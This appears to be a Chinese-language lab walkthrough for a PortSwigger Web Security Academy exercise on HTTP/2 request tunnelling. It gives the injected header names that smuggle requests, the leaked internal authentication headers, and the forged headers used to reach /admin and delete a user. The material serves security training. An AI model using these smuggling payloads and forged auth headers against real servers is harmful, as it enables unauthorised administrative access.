# 实验：通过 HTTP/2 请求隧道绕过访问控制

本实验容易受到请求走私的攻击，因为前端服务器会对 HTTP/2 请求进行降级，且未能充分清理传入的头部名称。要解决本实验，以 `administrator` 用户身份访问 `/admin` 下的管理面板，并删除用户 `carlos`。

前端服务器不复用到后端的连接，因此不易受到经典请求走私攻击。然而，它仍然容易受到[请求隧道]的攻击。

> **提示**
>
> 前端服务器会向传入请求附加一系列[客户端身份验证头部](/web-security/request-smuggling/exploiting#bypassing-client-authentication)。您需要找到泄露这些头部的方法。

## 步骤

探测
- 访问首页
    ```http
    GET / HTTP/2
    Host: id.web-security-academy.net
    ```

    - 响应
        ```http
        Content-Length: 8680
        ```
- 使用搜索功能，得到一批响应长度
    - 请求
        ```http
        GET /?search=abc HTTP/2`
        ```
        - 响应
            ```
            Content-Length: 3399
            ```

    - 请求
        ```http
        GET /?search=agi HTTP/2
        ```
        - 响应
            ```
            Content-Length: 4926
            ```

- 访问管理端点
    ```http
    GET /admin HTTP/2
    ```

    - 响应
        ```http
        HTTP/2 401 Unauthorized
        Content-Length: 2776
        ```

使用 HEAD 查看头部设置
- 请求
    ```http
    HEAD /admin HTTP/2`
    ```
- 使用 HEAD 设置较小长度响应端点，走私请求设置相同或较大响应长度端点
- 设置请求值
    `foo`
    :
    ```
    bar

    GET /?search=agi HTTP/1.1
    Host: id.web-security-academy.net
    X: x
    ```
    - 响应 RST

- 设置请求名

    ```
    foo: bar

    GET /?search=agi HTTP/1.1
    X
    ```
    :
    `x`
    - 此处并未设置 Host

    - 响应携带隧道
        ```http
        HTTP/2 401 Unauthorized
        Content-Type: text/html; charset=utf-8
        Set-Cookie: session=UM3DlEopiYQHPZvEyNmI5BnhJXykKChc; Secure; HttpOnly; SameSite=None
        Content-Length: 2776
        X-Frame-Options: SAMEORIGIN

        HTTP/1.1 200 OK
        Content-Type: text/html; charset=utf-8
        Set-Cookie: session=yOetibTEnTYhg1XjBrdH8jBxDGLSlqJD; Secure; HttpOnly; SameSite=None
        X-Frame-Options: SAMEORIGIN
        Keep-Alive: timeout=0
        Content-Length: 4926

        <!DOCTYPE html>
        <html>
        ```

- 尝试设置 Host
    - 无效
    - 或需得到前端重写头部

尝试得到前端重写头部
- 转换 search 的 GET 请求参数模式到 POST 请求体参数
    ```http
    POST / HTTP/2
    Host: id.web-security-academy.net
    Content-Length: 24

    search=aaaaaaaaaaaaddddd
    ```
    - 成功


- 攻击请求
    - 路径
        `/?search=abc`
        - 若不够长，仅需增加查询参数值

    - 头部
        - 名
            ```http
            foo: bar

            POST / HTTP/1.1
            Host: id.web-security-academy.net
            Content-Length: 110

            search=X
            ```
            - 逐渐微调携带内容长度

        - 值
            `x`

        - 额外方法：
            - 不是使用 HEAD 隧道技术设置额外请求，而是直接将 POST 搜索端点的后续头部设置为请求体参数
            - 名
                ``` 
                foo: bar[\r\n]
                Content-Length: 500[\r\n]
                [\r\n]
                search=
                ```
            - 值
                `bar`

- 响应
    ```http
    HTTP/2 200 OK
    Content-Type: text/html; charset=utf-8
    Set-Cookie: session=ii4gKwC9oU78inC3AQruplVHDmWm4U3L; Secure; HttpOnly; SameSite=None
    Content-Length: 3399
    X-Frame-Options: SAMEORIGIN

    HTTP/1.1 200 OK
    Content-Type: text/html; charset=utf-8
    Set-Cookie: session=KZ8JzKmMJt8crHHxibzXJcVpLBGYiCoo; Secure; HttpOnly; SameSite=None
    X-Frame-Options: SAMEORIGIN
    Keep-Alive: timeout=0
    Content-Length: 3499

    <!DOCTYPE html>
    <html>
    ...
        <h1>
            0 search results for 'X: x
            X-SSL-VERIFIED: 0
            X-SSL-CLIENT-CN: null
            X-FRONTEND-KEY: 5772619705877216
            Content-Length: 0
            
            '
        </h1>
    ...
    ```
    - 此处的3个 X 头部可能有趣


- 攻击请求
    - 端点
        `/?search=abc`
    - 走私请求
        - 头部名
            ```http
            foo: bar

            GET /admin HTTP/1.1
            Host: id.web-security-academy.net
            X-SSL-VERIFIED: 1
            X-SSL-CLIENT-CN: administrator
            X-FRONTEND-KEY: 5772619705877216

            X
            ```
            - 修改 X 验证为 1
            - 修改 X 客户端名称为管理员

        - 头部值
            `x`

- 响应
    ```html
    HTTP/2 200 OK
    Content-Type: text/html; charset=utf-8
    Set-Cookie: session=96qLvVWaALwpXcB7f9nIV5VJA5k4ORpD; Secure; HttpOnly; SameSite=None
    Content-Length: 3399
    X-Frame-Options: SAMEORIGIN

    HTTP/1.1 200 OK
    Content-Type: text/html; charset=utf-8
    Cache-Control: no-cache
    Set-Cookie: session=bpL6vH6vPwMQvFh1lBswxkuUC3jWfo3u; Secure; HttpOnly; SameSite=None
    X-Frame-Options: SAMEORIGIN
    Keep-Alive: timeout=0
    Content-Length: 3293

    <!DOCTYPE html>
    <html>
    ...
        <a href="/admin">Admin panel</a>
        ...
        <a href="/admin/delete?username=carlos">
        Delete
        </a>
        ...
    ```

    - 成功访问管理端点，并得到目标功能端点

- 设置走私路径为目标端点后成功执行
